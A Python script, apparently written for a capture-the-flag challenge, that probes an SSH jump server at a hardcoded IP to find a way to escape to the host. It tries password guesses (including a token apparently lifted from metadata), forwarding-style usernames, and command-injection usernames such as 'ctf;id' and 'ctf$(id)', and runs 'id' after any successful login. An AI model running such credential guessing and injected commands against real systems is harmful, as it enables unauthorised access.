#!/usr/bin/env python3
"""
深度思考：第二次SSH连接的错误

用户提示说"第二次SSH连接的错误是有用的提示"
这可能指：
1. 从第一层dropbear到第二层目标时产生的错误
2. 或者使用user@host格式时，转发到目标后的错误

让我们仔细分析各种场景下的错误信息
"""

import paramiko
import socket
import time
import logging

HOST = "61.147.171.105"
PORT = 55300

# 启用详细日志
logging.basicConfig(level=logging.DEBUG)
paramiko_logger = logging.getLogger("paramiko")

def capture_error_details():
    """
    捕获各种场景下的详细错误信息
    """
    print("=" * 70)
    print("[*] 捕获SSH错误详情")
    print("=" * 70)
    
    # 场景1: 使用user@host格式直接连接
    print("\n[1] 场景：使用ctf@172.17.0.1格式直接连接...")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((HOST, PORT))
        
        # 读取banner
        banner = b""
        while b"\r\n" not in banner:
            c = sock.recv(1)
            if not c:
                break
            banner += c
        print(f"  Banner: {banner.decode().strip()}")
        
        # 发送客户端版本
        sock.send(b"SSH-2.0-analyze\r\n")
        
        # 接收服务器KEX_INIT
        kex = sock.recv(4096)
        print(f"  KEX_INIT: {len(kex)} bytes")
        
        # 此时服务器应该已经知道我们是SSH客户端
        # 但还没有发送用户名
        
        # 继续监听
        time.sleep(0.5)
        try:
            sock.setblocking(False)
            more = sock.recv(1024)
            print(f"  更多数据: {more}")
        except BlockingIOError:
            print("  无更多数据")
        
        sock.close()
    except Exception as e:
        print(f"  错误: {e}")
    
    # 场景2: 正常连接后，在第二层使用不同凭据
    print("\n[2] 场景：嵌套连接时故意使用错误凭据...")
    
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(HOST, PORT, "ctf", "123456")
        transport = client.get_transport()
        
        # 连接到localhost（dropbear）
        chan = transport.open_channel("direct-tcpip", ("localhost", 22), ("127.0.0.1", 0))
        t2 = paramiko.Transport(chan)
        t2.start_client()
        
        # 使用错误密码
        print("  尝试错误密码...")
        try:
            t2.auth_password("ctf", "wrongpassword")
            print("  竟然成功了?!")
        except paramiko.AuthenticationException as e:
            print(f"  认证失败（预期）: {e}")
        except Exception as e:
            print(f"  其他错误: {e}")
        
        t2.close()
        client.close()
    except Exception as e:
        print(f"  错误: {e}")

def analyze_forwarding_behavior():
    """
    分析dropbear对user@host格式的转发行为
    
    关键问题：当使用ctf@172.17.0.1时
    1. dropbear是否会先建立到172.17.0.1:22的连接？
    2. 是否会传递我们的密码进行认证？
    3. 认证失败后是否有错误信息返回？
    """
    print("\n" + "=" * 70)
    print("[*] 分析转发行为")
    print("=" * 70)
    
    # 使用paramiko低级API
    print("\n尝试使用不同格式的用户名...")
    
    test_cases = [
        ("ctf", "123456", "正常用户名"),
        ("ctf@localhost", "123456", "转发到localhost"),
        ("ctf@172.17.0.1", "123456", "转发到真实主机"),
    ]
    
    for username, password, description in test_cases:
        print(f"\n--- {description} ({username}) ---")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)
            sock.connect((HOST, PORT))
            
            # 创建paramiko transport
            t = paramiko.Transport(sock)
            
            try:
                t.start_client()
                print(f"  版本: {t.remote_version}")
                print(f"  Host Key: {t.get_remote_server_key().get_fingerprint().hex()[:32]}")
                
                # 尝试认证
                try:
                    t.auth_password(username, password)
                    print(f"  认证成功!")
                    
                    # 如果成功，尝试执行命令
                    try:
                        chan = t.open_channel("session")
                        chan.exec_command("id")
                        time.sleep(0.5)
                        output = chan.recv(1024).decode()
                        print(f"  命令输出: {output[:100]}")
                        chan.close()
                    except Exception as e:
                        print(f"  命令执行错误: {e}")
                        
                except paramiko.AuthenticationException as e:
                    print(f"  认证失败: {e}")
                except paramiko.SSHException as e:
                    print(f"  SSH错误: {e}")
                    
            except paramiko.SSHException as e:
                # 这里可能捕获到banner错误等
                print(f"  连接错误: {e}")
                
            t.close()
            
        except socket.timeout:
            print(f"  超时")
        except Exception as e:
            print(f"  错误: {e}")

def test_with_different_passwords():
    """
    测试：如果dropbear转发用户名中的目标，是否也转发密码？
    
    如果ctf@172.17.0.1会被转发，那么：
    - 我们提供的密码（123456）应该被用于认证172.17.0.1
    - 但172.17.0.1不接受ctf:123456
    - 所以认证失败
    
    那如果我们提供Ubuntu主机正确的密码会怎样？
    问题是我们不知道Ubuntu的密码...
    
    除非！有其他线索告诉我们密码？
    """
    print("\n" + "=" * 70)
    print("[*] 测试不同密码")
    print("=" * 70)
    
    # 可能的密码线索
    # 从Rancher metadata获取的token可能是密码？
    possible_passwords = [
        "123456",
        "password",
        "root",
        "ubuntu",
        "ctf",
        "",
        "flag",
        "RwkgqPR473FQQ25Lc3sCgVG1sM6iTm2G42i8oZHu",  # token from metadata
    ]
    
    print("\n注意：这个测试需要知道172.17.0.1的正确凭据")
    print("由于我们不知道，所以只能尝试猜测...")

def understand_hint_better():
    """
    深入理解提示
    
    用户说：
    1. SSH特性利用，不是漏洞利用
    2. 类似FakeJumpServer
    3. 第二次SSH连接的错误有用
    4. 用户名/密码注入无关
    
    结合这些：
    - "SSH特性" 可能指 ProxyJump, Agent Forwarding, Port Forwarding等
    - "FakeJumpServer" 涉及SSH跳板机攻击
    - "第二次SSH连接" 指的是通过跳板机到目标的连接
    - "用户名/密码注入无关" 说明不是通过注入来绕过
    
    核心思路：
    FakeJumpServer攻击中，攻击者控制跳板机
    当用户通过跳板机连接到其他主机时：
    1. 跳板机可以记录/转发凭据
    2. 跳板机可以劫持SSH agent
    3. 跳板机可以中间人攻击
    
    在这个题目中：
    - 我们是用户，想要逃逸到宿主机
    - dropbear是（恶意的？）跳板机
    
    如果dropbear会自动转发某些连接...
    而我们能控制转发的目标...
    我们能否让dropbear帮我们认证到宿主机？
    
    等等！如果dropbear有存储的凭据或密钥，
    用于转发连接时的认证，
    我们是否能利用这个？
    """
    print("\n" + "=" * 70)
    print("[*] 深入理解提示")
    print("=" * 70)
    
    print("""
    关键洞察：
    -----------
    如果dropbear作为FakeJumpServer，它可能：
    1. 有存储的凭据用于连接真实目标
    2. 或者有SSH密钥可以免密登录真实目标
    
    我们需要找到一种方式让dropbear用它的凭据帮我们登录！
    
    可能的方式：
    1. 使用正确的用户名格式触发自动登录
    2. 找到dropbear存储的凭据/密钥
    3. 利用某些SSH特性来传递认证
    """)

def test_various_username_formats():
    """
    测试更多用户名格式，看是否有特殊效果
    """
    print("\n" + "=" * 70)
    print("[*] 测试各种用户名格式")
    print("=" * 70)
    
    formats = [
        # 可能触发特殊行为的格式
        "root",
        "admin",
        "ubuntu",
        "flag",
        "9p",
        "mount",
        "escape",
        # 带参数的格式
        "ctf@172.17.0.1@ctf",
        "ctf:172.17.0.1",
        "ctf+172.17.0.1",
        "ctf%172.17.0.1",
        # 命令注入尝试（虽然说不相关，但还是试试）
        "ctf;id",
        "ctf`id`",
        "ctf$(id)",
        # 特殊前缀
        "-ctf",
        "--help",
        "-v",
    ]
    
    for username in formats:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(HOST, PORT, username=username, password="123456", 
                          timeout=5, banner_timeout=5)
            
            # 检查连接到了哪里
            t = client.get_transport()
            key = t.get_remote_server_key()
            fingerprint = key.get_fingerprint().hex()
            
            print(f"[+] {username:30} => 成功! Key: {fingerprint[:16]}")
            
            # 尝试执行命令
            try:
                stdin, stdout, stderr = client.exec_command("id", timeout=3)
                output = stdout.read().decode()
                error = stderr.read().decode()
                if output:
                    print(f"    输出: {output[:50]}")
            except:
                pass
            
            client.close()
        except paramiko.AuthenticationException:
            print(f"[-] {username:30} => 认证失败")
        except paramiko.SSHException as e:
            if "banner" in str(e).lower():
                print(f"[!] {username:30} => 连接关闭（可能触发转发）")
            else:
                print(f"[-] {username:30} => SSH错误: {e}")
        except Exception as e:
            print(f"[-] {username:30} => 错误: {e}")

if __name__ == "__main__":
    # capture_error_details()
    analyze_forwarding_behavior()
    # test_with_different_passwords()
    understand_hint_better()
    test_various_username_formats()
